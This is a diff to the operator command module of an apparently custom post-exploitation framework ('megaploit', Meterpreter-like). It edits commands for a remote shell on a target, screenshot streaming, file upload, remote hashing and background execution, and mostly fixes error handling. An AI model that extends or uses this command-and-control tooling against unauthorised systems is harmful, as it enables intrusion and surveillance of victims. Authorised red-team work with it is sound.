@@ -123,27 +123,6 @@ def _recv_file_or_err(conn, local: str, timeout: float | None = None) -> "Comman
 # Core
 # ---------------------------------------------------------------------------
 
-@_cmd("note", usage="note <text>",
-      help_text="Append a note to this session (saved with the session, included in reports)")
-def cmd_note(session: Session, args: list[str]) -> CommandResult:
-    if not args:
-        return _err("Usage: note <text>")
-    text = " ".join(args)
-    if session.notes:
-        session.notes = session.notes + "\n" + text
-    else:
-        session.notes = text
-    return _ok(f"[+] Note saved: {text[:80]}")
-
-
-@_cmd("notes", usage="notes",
-      help_text="Show all notes recorded for this session")
-def cmd_notes(session: Session, args: list[str]) -> CommandResult:
-    if not session.notes:
-        return _ok("(no notes)")
-    return _ok(session.notes)
-
-
 @_cmd("help", usage="help", help_text="Show this help message")
 def cmd_help(session: Session, args: list[str]) -> CommandResult:
     lines = ["", f"  {'COMMAND':<36}  DESCRIPTION"]
@@ -1041,8 +1020,8 @@ def cmd_zip_upload(session: Session, args: list[str]) -> CommandResult:
         send_file(session.conn, tmp_path)
         try:
             ack = recv_msg(session.conn)
-        except Exception:
-            ack = ""
+        except (ConnectionError, OSError, ValueError) as e:
+            return _err(f"[-] zip_upload sent but no ACK received: {e}")
         return _ok(f"[+] Uploaded '{local_dir}' as '{remote_name}'"
                    + (f"\n    Agent: {ack}" if ack else ""))
     finally:
@@ -1638,6 +1617,9 @@ def cmd_screenshot_stream(session: Session, args: list[str]) -> CommandResult:
                 with open(fname, "wb") as f:
                     f.write(data)
                 frames_saved += 1
+            elif isinstance(msg, str) and msg.startswith("[-]"):
+                # Agent returned an error string instead of starting the stream
+                return _err(msg)
     except Exception as e:
         return _err(f"stream error after {frames_saved} frames: {e}")
     finally:
@@ -1695,9 +1677,15 @@ def cmd_beacon_sleep(session: Session, args: list[str]) -> CommandResult:
 @_cmd("interactive", usage="interactive",
       help_text="Drop into a real PTY shell session on the target (Ctrl-C to detach)")
 def cmd_interactive(session: Session, args: list[str]) -> CommandResult:
-    """Handled by MeterpreterSession.interact() — this stub allows CLI fallback."""
-    send_msg(session.conn, "pty_shell")
-    return _ok(recv_msg(session.conn))
+    """
+    Handled by MeterpreterSession._interactive_pty() which owns the full
+    PTY handshake and I/O loop.  This stub is reached only from the plain
+    session loop — direct the operator to use the irb/interact command.
+    """
+    return _ok(
+        "[*] Use the  irb  command from within a session to enter interactive PTY mode.\n"
+        "    (type  use <id>  then  irb)"
+    )
 
 
 # ---------------------------------------------------------------------------
@@ -1851,16 +1839,25 @@ def cmd_verify(session: Session, args: list[str]) -> CommandResult:
         return _err(f"Cannot read local file: {e}")
     local_hash = h.hexdigest()
 
-    # Ask agent for remote hash
+    # Ask agent for remote hash.
+    # The file_hash handler returns a two-line response:
+    #   "[+] SHA-256  <path>"
+    #   "    <64-hex-chars>"
+    # We anchor on the dedicated hex line immediately following the "[+]" line
+    # rather than free-scanning all text (H2 fix: avoids matching stray hex
+    # strings in error messages, certificates, or memory addresses).
     send_msg(session.conn, f"file_hash {remote_path}")
     remote_response = recv_msg(session.conn)
-    # Handler returns:  "[+] SHA-256  <path>\n    <hex>"
     remote_hash = ""
-    for line in remote_response.splitlines():
-        stripped = line.strip()
-        if len(stripped) == 64 and all(c in "0123456789abcdef" for c in stripped):
-            remote_hash = stripped
-            break
+    lines = remote_response.splitlines()
+    for idx, line in enumerate(lines):
+        if line.strip().startswith("[+]") and "SHA-256" in line:
+            # The hash is on the very next line
+            if idx + 1 < len(lines):
+                candidate = lines[idx + 1].strip()
+                if len(candidate) == 64 and all(c in "0123456789abcdef" for c in candidate):
+                    remote_hash = candidate
+                    break
 
     if not remote_hash:
         return _err(f"Could not parse remote hash from: {remote_response}")
@@ -1893,11 +1890,21 @@ def cmd_run_bg(session: Session, args: list[str]) -> CommandResult:
     from megaploit.core.protocol import send_msg as _sm, recv_msg as _rm
 
     cmd_str = " ".join(args)
-    conn    = session.conn
+    # H1: capture the session object (not the raw socket) so that the job can
+    # use session.conn at call-time rather than closing over a potentially
+    # stale socket object from submission time.  A 60-second recv timeout
+    # prevents the background thread from hanging forever on a silent agent.
+    sess_ref = session
 
     def _bg_runner():
+        conn = sess_ref.conn
         _sm(conn, cmd_str)
-        return _rm(conn)
+        old_to = conn.gettimeout()
+        conn.settimeout(60.0)
+        try:
+            return _rm(conn)
+        finally:
+            conn.settimeout(old_to)
 
     jid = job_manager.submit(f"run_bg:session#{session.id}:{cmd_str[:40]}", _bg_runner)
     return _ok(
